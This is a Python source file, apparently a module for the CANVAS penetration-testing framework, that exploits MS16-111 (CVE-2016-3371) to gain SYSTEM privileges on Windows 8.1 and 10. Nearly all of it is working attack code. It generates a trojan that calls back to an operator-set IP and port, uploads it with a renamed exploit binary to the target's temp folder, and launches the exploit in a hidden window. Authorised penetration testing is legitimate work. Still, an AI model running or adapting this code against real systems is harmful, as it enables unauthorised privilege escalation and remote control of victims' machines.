#!/usr/bin/env python

import os
import sys
import random

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from shellcode.standalone.windows.payloads import payloads
from shellcode.standalone.windows.payloads64 import payloads as payloads64
import canvasengine
from MOSDEF import pelib

from libs.canvasos import canvasos

import logging


NAME                           = 'MS16-111 Registry Hive Hijack'
DESCRIPTION                    = 'MS16-111 Registry hive hijack allows executables to be ran with SYSTEM privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2016-3371'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3371'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows', 'x86'],
                                   ['Windows', 'x64'],
]
PROPERTY['MS PATCHES']         = ["KB3175024"]

PROPERTY['VERSION']            = ['Windows 10',
                                  'Windows 8.1']
DOCUMENTATION["References"]    = ["https://technet.microsoft.com/en-us/library/security/ms16-111.aspx",
                                  "https://bugs.chromium.org/p/project-zero/issues/detail?id=865"]
DOCUMENTATION['Notes']         = """
Tested against:
Windows 10 x64 EN (both Chinese and English usernames) - SUCCESSFUL EOP


Windows XP x86 - EXECUTABLE DOES NOT RUN
Windows 7 x86 - NOT VULNERABLE
Windows Server 2008 R2 x86_64 - NOT VULNERABLE

Windows 8.1 x86 - SUCCESSFUL EOP
Windows 8.1 x64 - SUCCESSFUL EOP

Credit to James Foreshaw of Google Project Zero for exposing the vulnerability and inspiring us with an exploitation technique.

"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}

random_name_chars = [chr(x) for x in range(ord('a'), ord('z')+1) + range(ord('A'), ord('Z')+1) + range(ord('0'), ord('9')+1)]

def random_string(length):
    global random_name_chars

    chars = []

    for i in range(0, length):
        chars.append(random_name_chars[random.randint(0, length)])

    return "".join(chars)


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name                   = NAME
        self.node                   = None
        self.local_res              = os.path.join(os.path.dirname(__file__), 'Resources')
        self.use_local_interface    = False

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def replace_c_string(self, buf, needle, replacement):
        if not (len(needle) >= len(replacement)):
            logging.error("Replacing %s with %s is not allowed - the latter is too long of a string!" % (needle, replacement))

        replacement = replacement + "\x00" * (len(needle) - len(replacement))

        return buf.replace(needle, replacement)

    def replace_unicode_string(self, buf, needle, replacement):
        if not (len(needle) >= len(replacement)):
            logging.error("Replacing %s with %s is not allowed - the latter is too long of a string!" % (needle, replacement))

        uni_needle = needle.encode("utf-16")[2:]
        uni_replacement = replacement.encode("utf-16")[2:] + ("\x00\x00" * (len(needle) - len(replacement)))

        return buf.replace(uni_needle, uni_replacement)

    def prepare_executables(self, tmp_directory):
        exploit_name = "%s.exe" % random.randint(1001, 2000)
        exploit_local_path = os.path.join(self.local_res, "tmp_%s" % exploit_name)
        exploit_rem_path = tmp_directory + exploit_name

        mosdef_name = random_string(len("mosdefcallback")) + ".exe"
        mosdef_local_path = os.path.join(self.local_res, "tmp_%s" % mosdef_name)
        mosdef_rem_path = tmp_directory + mosdef_name

        return_value = [(exploit_local_path, exploit_rem_path),
                        (mosdef_local_path, mosdef_rem_path)]

        exploit_orig_name = "exploit32.exe"
        if self.is_64bit_node() or self.has_wow64():
            exploit_orig_name = "exploit64.exe"

        # Generate the MOSDEF executable

        t_os = canvasos('WINDOWS')
        t_os.arch = 'X64' if self.is_64bit_node() or self.has_wow64() else 'X86'

        created_trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)

        if created_trojan != True:
            self.log_error("Error in generating our MOSDEF executable")
            return None
        else:
            logging.info("Writing MOSDEF callback to %s" % mosdef_local_path)

            with open(mosdef_local_path, "wb") as handle:
                handle.write(self.mosdeftrojan)

                exploit_data = None

        with open(os.path.join(self.local_res, exploit_orig_name), "rb") as handle:
            exploit_data = handle.read()

        # exploit_data = self.replace_unicode_string(exploit_data, "MOSDEF_SHIM_DLL_PATH" + c_string_padding,
        #                                      mosdef_rem_path)

        exploit_data = self.replace_c_string(exploit_data, "RANDOM_ASCII_STRING_HERE", random_string(len("RANDOM_ASCII_STRING_HERE")))
        # COM object registration script path
        exploit_data = self.replace_unicode_string(exploit_data, "replace.sct", random_string(len("replace")) + ".sct")
        # Registry hive path
        exploit_data = self.replace_unicode_string(exploit_data, "replace.hiv", random_string(len("replace")) + ".hiv")
        # Callback path
        exploit_data = self.replace_unicode_string(exploit_data, "mosdefcallback.exe", mosdef_name)


        logging.info("Writing exploit to %s" % exploit_local_path)

        with open(exploit_local_path, "wb") as handle:
            handle.write(exploit_data)

        return return_value

    def spawn_exploit(self, path):
        # NOTE: this exploit does not support Windows XP or Windows 7
        if self.is_win81_node():
            osVersion = 'win81'
        elif self.is_win10_node():
            osVersion = "win10"
        else:
            major, minor, sp = self.GetVersionEx()
            self.log_error("Unsupported OS (GetVersionEx %d.%d.%d), bailing" % (major, minor, sp))
            return 0

        logging.info("Spawning exploit: %s (version: %s)" % (path, osVersion))
        try:
            cmd_line = path
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            self.log_error('%s' % ex)
            return False

        return ret

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node

            if not self.is_windows_node():
                continue

            if (self.is_win10_node() or self.is_win2016_node()):
                if self.get_releaseid() > 1703:
                    logging.error("Windows 10 version not supported")
                    continue


            if not self.is_win81_node():
                logging.error("Not Windows 8.1 / 10 node! Aborting")
                continue
            

            if self.is_win10_node():
                if self.get_releaseid() > 1703:
                    logging.error("Windows 10 version not supported")
                    return False

            # first, we check to make sure we are not
            # already local/SYSTEM
            if self.compromised():
                logging.warning("It appears you are already running as LOCAL/SYSTEM")
                continue

            tmp_path = self.node.shell.GetTempPathA()
            if not tmp_path:
                logging.error('Could not resolve full temp dir path')
                continue
            else:
                logging.info('Temp dir: %s' % tmp_path)

            if self.node.shell.chdir(tmp_path) < 0:
                logging.error('Could not chdir into %s' % tmp_path)
                continue

            pe_info = self.prepare_executables(tmp_path)

            logging.info("Callback IP: %s" % self.callback.ip)
            logging.info("Callback port: %s" % self.callback.port)

            if pe_info == None:
                logging.error("Failed to generate necessary executables")
                return 0

            remote_exploit_path = None

            for (local_path, remote_path) in pe_info:
                if not self.nodeUpload(local_path, remote_path):
                    logging.error('Error while uploading exploit binary')
                    return 0

                os.unlink(local_path)

            remote_exploit_path = pe_info[0][1]

            problem_exploit = False

            if not self.spawn_exploit(remote_exploit_path):
                logging.error('Could not spawn %s' % NAME)
            else:
                for i in range(30):
                    if self.ISucceeded():
                        ret = 1
                        self.summary[node] = 1
                    time.sleep(0.5)

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
